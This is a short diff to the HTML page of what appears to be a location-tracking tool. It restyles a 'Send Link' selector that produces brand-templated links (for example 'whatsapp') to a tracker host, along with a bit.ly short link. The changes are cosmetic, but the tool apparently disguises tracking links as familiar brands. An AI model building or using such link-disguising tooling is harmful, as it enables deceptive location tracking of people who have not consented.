@@ -168,7 +168,12 @@
         }
         #brandSelector .short-link {
             color: #ffc107;
-            font-size: 11px;
+            font-size: 13px;
+            font-weight: bold;
+            background: #0f3460;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-family: monospace;
         }
         @media (max-width: 768px) {
             #brandSelector { flex-direction: column; align-items: stretch; }
@@ -192,6 +197,9 @@
     </div>
 </div>
 
+<!-- ========================================= -->
+<!-- BRAND SELECTOR WITH SHORT LINK           -->
+<!-- ========================================= -->
 <div id="brandSelector">
     <label for="brandSelect">🔗 Send Link:</label>
     <select id="brandSelect">
@@ -203,7 +211,7 @@
     </select>
     <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
     <button class="copy-link" id="copyLinkBtn">📋 Copy Link</button>
-    <span class="short-link" id="shortLinkDisplay">Short: bit.ly/4hOCDYS</span>
+    <span class="short-link" id="shortLinkDisplay">bit.ly/4hOCDYS</span>
 </div>
 
 <div id="infoPanel">
@@ -249,7 +257,7 @@
         const fullUrl = BASE_URL + '/?template=' + brand;
         const shortUrl = SHORT_LINKS[brand] || '';
         linkDisplay.textContent = fullUrl;
-        shortLinkDisplay.textContent = 'Short: ' + shortUrl;
+        shortLinkDisplay.textContent = shortUrl;
     }
 
     brandSelect.addEventListener('change', updateLink);
